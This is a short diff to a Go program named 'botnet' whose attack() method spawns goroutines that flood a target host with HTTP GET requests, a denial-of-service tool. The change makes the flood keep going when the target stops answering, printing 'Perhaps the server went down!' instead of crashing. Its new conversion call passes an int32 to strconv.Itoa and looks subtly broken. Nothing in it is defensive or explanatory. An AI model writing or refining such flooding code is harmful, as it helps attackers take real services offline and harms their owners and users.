@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"strconv"
 )
 
 type botnet struct {
@@ -63,9 +64,10 @@ func (b botnet) attack() {
 			go func(c chan string, idx int32) {
 				_, err := http.Get(b.targetHost)
 				if err != nil {
-					panic(err.Error())
+					fmt.Println("ERROR:", err.Error())
+					fmt.Println("Perhaps the server went down!")
 				}
-				c <- "END ROUTINE " + string(idx)
+				c <- "END ROUTINE " + strconv.Itoa(idx)
 			}(b.channel, i)
 		}
 		for i := b.maxRoutines; i > 0; i-- {
